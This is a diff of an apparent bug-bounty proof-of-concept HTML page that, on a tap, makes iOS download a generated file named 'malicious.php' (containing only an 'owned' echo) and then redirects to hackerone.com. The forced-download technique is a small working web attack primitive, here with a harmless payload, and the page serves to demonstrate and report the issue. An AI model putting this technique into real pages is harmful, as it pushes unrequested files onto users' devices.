@@ -1,52 +1,62 @@
 <!doctype html>
 <html>
 <head>
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>iOS Download POC</title>
-<style>
-  body {
-    height: 100vh;
-    margin: 0;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    font-family: sans-serif;
-    background: #fafafa;
-    cursor: pointer;
-  }
-  h1 {
-    text-align: center;
-    max-width: 420px;
-  }
-</style>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>iOS Forced Download POC</title>
+  <style>
+    body {
+      height: 100vh;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: sans-serif;
+      background: #fafafa;
+      cursor: pointer;
+    }
+    h1 {
+      text-align: center;
+      max-width: 420px;
+    }
+  </style>
 </head>
 <body>
 
 <h1>
-Tap anywhere.<br>
-iOS will download a file.
+  Tap anywhere.<br>
+  iOS will download a file and then navigate to another page.
 </h1>
 
 <script>
 document.addEventListener('click', () => {
+  // File content to be "downloaded"
   const payload = `<?php echo "owned"; ?>`;
 
+  // Creating a Blob object with MIME type
   const blob = new Blob([payload], {
     type: 'application/octet-stream'
   });
 
+  // Creating an object URL for the Blob
   const url = URL.createObjectURL(blob);
 
+  // Creating an <a> tag to trigger the download
   const a = document.createElement('a');
   a.href = url;
-  a.download = 'malicious.php'; // iOS will still offer download
+  a.download = 'malicious.php'; // Suggested file name for download
   document.body.appendChild(a);
-  a.click();
+  a.click(); // Simulating the click to trigger the download
 
+  // Cleanup after the download is triggered
   setTimeout(() => {
-    URL.revokeObjectURL(url);
-    a.remove();
+    URL.revokeObjectURL(url); // Revoke the URL after the download
+    a.remove(); // Clean up the <a> element
   }, 1000);
+
+  // Optional: Navigation after a delay (simulating a "chain")
+  setTimeout(() => {
+    location.href = 'https://hackerone.com'; // Redirecting after 3 seconds
+  }, 3000); // Delay for navigation after download
 }, { once: true });
 </script>
 
